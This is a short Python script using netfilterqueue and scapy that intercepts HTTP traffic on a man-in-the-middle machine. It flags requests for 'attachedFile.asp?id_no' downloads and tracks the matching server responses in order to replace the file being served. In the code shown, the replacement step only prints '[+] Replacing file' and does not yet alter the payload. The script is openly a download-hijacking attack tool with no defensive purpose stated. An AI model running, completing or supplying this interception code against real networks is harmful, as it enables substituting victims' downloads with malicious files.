import netfilterqueue
import scapy.all as scapy


ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    '''
        here we check if have http layer
        we do not know if have reqhttp / reshttp
        scapy work contain the main layer tcp udp ip
        and in the last the row data => http data and row layer
    '''
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if "attachedFile.asp?id_no" in str(scapy_packet[scapy.Raw].load):
                print("[+] File Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                print(scapy_packet.show())
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
